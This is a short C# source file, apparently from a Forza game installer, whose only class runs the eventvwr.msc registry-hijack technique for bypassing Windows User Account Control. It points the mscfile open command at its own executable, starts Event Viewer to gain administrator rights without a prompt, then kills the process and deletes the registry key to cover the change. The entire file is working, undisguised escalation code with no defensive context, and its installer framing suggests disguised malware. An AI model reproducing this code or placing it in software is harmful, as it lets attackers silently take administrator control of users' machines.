using Microsoft.Win32;
using System.Diagnostics;

namespace ForzaInstallation.Uac
{
    internal static class EventViewer
    {
        internal static bool Execute()
        {
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command"))
                {
                    if (key == null) return false;
                    key.SetValue("", path);
                }
                var proc = Process.Start("eventvwr.msc");
                System.Threading.Thread.Sleep(5000);
                try { if (proc != null && !proc.HasExited) proc.Kill(); } catch { }
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile\shell\open\command", false);
                return true;
            }
            catch { return false; }
        }
    }
}
